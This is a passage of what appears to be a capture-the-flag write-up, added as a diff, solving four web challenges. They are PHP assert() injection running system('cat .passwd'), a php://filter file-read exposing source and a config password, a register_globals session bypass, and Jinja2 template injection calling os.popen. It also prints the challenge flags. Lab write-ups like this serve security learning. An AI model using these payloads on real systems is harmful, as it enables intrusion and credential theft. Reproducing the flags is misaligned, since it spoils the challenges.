@@ -433,3 +433,201 @@ Because the token was saved in blacklist, but based base64 decode we have the `=
 {"Congratzzzz!!!_flag:":"Do_n0t_r3v0ke_3nc0d3dTokenz_Mam3ne-Us3_th3_JTI_f1eld"}
 ```
 
+### PHP - assert()
+
+This application include local file, when i change `?page=../` it raise error:
+
+```
+Warning: assert(): Assertion "strpos('includes/../.php', '..') === false" failed in /challenge/web-serveur/ch47/index.php on line 8 Detected hacking attempt!
+```
+
+To fill valid strpos() function and get the .password, we can use the payload:
+
+`?page=about.php%27,%27.%27)===false%20or%20system(%27cat%20.passwd%27);//`
+
+```
+The flag is / Le flag est : x4Ss3rT1nglSn0ts4f3A7A1Lx Remember to sanitize all user input! / Pensez à valider toutes les entrées utilisateurs ! Don't use assert! / N'utilisez pas assert ! 'includes/about.php','.')===false or system('cat .passwd');//.php'File does not exist
+```
+
+### PHP - Filters
+
+This application include local file, we can use PHP Wrapper to bypass: `?inc=php://filter/read=convert.base64-encode/resource=index.php`
+
+```
+home
+login
+PD9waHAgaW5jbHVkZSgiY2gxMi5waHAiKTs/Pg==
+```
+
+Base64 decode:
+
+```
+echo -n PD9waHAgaW5jbHVkZSgiY2gxMi5waHAiKTs/Pg== | base64 -d
+<?php include("ch12.php");?>
+```
+
+Next we get the content of ch12.php: `?inc=php://filter/read=convert.base64-encode/resource=ch12.php`
+
+```
+PD9waHAKCiRpbmM9ImFjY3VlaWwucGhwIjsKaWYgKGlzc2V0KCRfR0VUWyJpbmMiXSkpIHsKICAgICRpbmM9JF9HRVRbJ2luYyddOwogICAgaWYgKGZpbGVfZXhpc3RzKCRpbmMpKXsKCSRmPWJhc2VuYW1lKHJlYWxwYXRoKCRpbmMpKTsKCWlmICgkZiA9PSAiaW5kZXgucGhwIiB8fCAkZiA9PSAiY2gxMi5waHAiKXsKCSAgICAkaW5jPSJhY2N1ZWlsLnBocCI7Cgl9CiAgICB9Cn0KCmluY2x1ZGUoImNvbmZpZy5waHAiKTsKCgplY2hvICcKICA8aHRtbD4KICA8Ym9keT4KICAgIDxoMT5GaWxlTWFuYWdlciB2IDAuMDE8L2gxPgogICAgPHVsPgoJPGxpPjxhIGhyZWY9Ij9pbmM9YWNjdWVpbC5waHAiPmhvbWU8L2E
+```
+
+Base64 decode:
+
+```
+<?php
+
+$inc="accueil.php";
+if (isset($_GET["inc"])) {
+    $inc=$_GET['inc'];
+    if (file_exists($inc)){
+        $f=basename(realpath($inc));
+        if ($f == "index.php" || $f == "ch12.php"){
+            $inc="accueil.php";
+        }
+    }
+}
+
+include("config.php");
+
+
+echo '
+  <html>
+  <body>
+    <h1>FileManager v 0.01</h1>
+    <ul>
+        <li><a href="?inc=accueil.php">home</a></li>
+        <li><a href="?inc=login.php">login</a></li>
+    </ul>
+';
+include($inc);
+
+echo '
+  </body>
+  </html>
+';
+
+
+?>
+```
+
+Next we get the content of config.php: `?inc=php://filter/read=convert.base64-encode/resource=config.php`
+
+```
+PD9waHAKJHVzZXJuYW1lPSJhZG1pbiI7CiRwYXNzd29yZD0iREFQdDlEMm1reTBBUEFGIjsK
+```
+
+Base64 decode:
+
+```
+<?php
+$username="admin";
+$password="DAPt9D2mky0APAF";
+```
+
+### PHP - register globals
+
+It seems that the developper often leaves backup files around...
+
+We can download the file `index.php.bak` file with the following content:
+
+```php
+<?php
+
+
+function auth($password, $hidden_password){
+    $res=0;
+    if (isset($password) && $password!=""){
+        if ( $password == $hidden_password ){
+            $res=1;
+        }
+    }
+    $_SESSION["logged"]=$res;
+    return $res;
+}
+
+
+
+function display($res){
+    $aff= '
+          <html>
+          <head>
+          </head>
+          <body>
+            <h1>Authentication v 0.05</h1>
+            <form action="" method="POST">
+              Password&nbsp;<br/>
+              <input type="password" name="password" /><br/><br/>
+              <br/><br/>
+              <input type="submit" value="connect" /><br/><br/>
+            </form>
+            <h3>'.htmlentities($res).'</h3>
+          </body>
+          </html>';
+    return $aff;
+}
+
+
+
+session_start();
+if ( ! isset($_SESSION["logged"]) )
+    $_SESSION["logged"]=0;
+
+$aff="";
+include("config.inc.php");
+
+if (isset($_POST["password"]))
+    $password = $_POST["password"];
+
+if (!ini_get('register_globals')) {
+    $superglobals = array($_SERVER, $_ENV,$_FILES, $_COOKIE, $_POST, $_GET);
+    if (isset($_SESSION)) {
+        array_unshift($superglobals, $_SESSION);
+    }
+    foreach ($superglobals as $superglobal) {
+        extract($superglobal, 0 );
+    }
+}
+
+if (( isset ($password) && $password!="" && auth($password,$hidden_password)==1) || (is_array($_SESSION) && $_SESSION["logged"]==1 ) ){
+    $aff=display("well done, you can validate with the password : $hidden_password");
+} else {
+    $aff=display("try again");
+}
+
+echo $aff;
+
+?>
+```
+
+We need to set `$_SESSION["logged"]==1`, let's add parameter `?_SESSION[logged]=1` into URL:
+
+```
+well done, you can validate with the password : NoTQYipcRKkgrqG
+```
+
+### Python - Server-side Template Injection Introduction
+
+This service allows you to generate a web page. Use it to read the flag!
+
+When we try submit `title=123&content=%7B%7B3**3%7D%7D&button=`, the response is:
+
+```
+{"content":"27","title":"123"}
+```
+
+We can see 3**3 = 27 -> Now we will inject to content field.
+
+You can find some payload is here: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md
+
+With payload: `content={{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("ls -a").read()}}`
+
+```
+{"content":".\n..\n._firewall\n.git\n._nginx.server-level.inc\n.passwd\n._perms\nrequirements.txt\n._run\nserver_ch74.py\nstatic\ntemplates\n","title":"123"}
+```
+
+Read password: `content={{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("cat .passwd").read()}}`
+
+```
+{"content":"Python_SST1_1s_co0l_4nd_mY_p4yl04ds_4r3_1ns4n3!!!\n","title":"123"}
+```
